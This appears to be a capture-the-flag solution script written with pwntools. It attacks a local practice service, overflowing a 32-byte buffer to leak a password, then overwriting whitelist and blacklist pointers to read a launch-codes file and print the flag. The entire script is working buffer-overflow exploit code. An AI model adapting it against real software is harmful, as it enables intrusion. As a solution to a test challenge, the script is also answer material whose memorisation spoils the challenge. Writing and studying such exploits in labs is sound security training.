#!/usr/bin/env python3
from pwn import *
elf = ELF("./environment/vulran_secret_service", checksec=False)
p = remote("127.0.0.1", 6767)


# Step 1 - leak password
password_addr = elf.sym["password"]
print(f"Password address: {hex(password_addr)}")
is_auth_addr = elf.sym["isAuthenticated"]
print(f"isAuthAddr address: {hex(is_auth_addr)}")

payload  = b"A" * 32
payload += p64(is_auth_addr)
payload += p64(password_addr)[:7]

print(p.recvuntil(b"> ").decode())
p.sendline(b"auth")
print(p.recvuntil(b": ").decode())

p.sendline(payload)
password = p.recvuntil(b"\n")
print(f"Password: {password.decode()}")

print(p.recvuntil(b"> ").decode())
p.sendline(b"auth")
print(p.recvuntil(b": ").decode())

p.sendline(password)
print(p.recvuntil(b"> ").decode())

# Step 2 - overrun short mode
p.sendline(b"read")
print(p.recvuntil(b"> ").decode())
payload = b"A" * 32
p.sendline(payload)
print(p.recvuntil(b"> ").decode())

# Step 3 - overrun the struct.
# Stack:
"""
buffer[32]
shortMode;
whitelist[4]
blacklist[4]
"""
launch_codes_addr=0x4024bd
whatever_string=0x40248f

text = b"launch_codes.txt"
rem = 32 - len(text) 
payload = text
payload += b"\x00" * rem

assert len(payload) == 32
payload += p32(0)
payload += b"B" * 4 #padding
payload += p64(launch_codes_addr) * 4
payload += p64(whatever_string) * 3
p.sendline(payload)
# launch code description etc
print(p.recvuntil("                        ").decode())
launch_code = p.recvuntil(b" ")
print(f"launch code: {launch_code.decode()}")

# Step 4 - launch the missile
print(p.recvuntil(b"> ").decode())
p.sendline(b"done")
print(p.recvuntil(b"> ").decode())

p.sendline(b"launch")
print(p.recvuntil(b"> ").decode())
p.sendline(launch_code)
print(p.recvuntil(b"\n").decode())
flag = p.recvuntil(b"}").decode()
p.recvuntil(b"> ")
p.sendline(b"exit")
print(p.recvall().decode())

print(f"flag: {flag}")
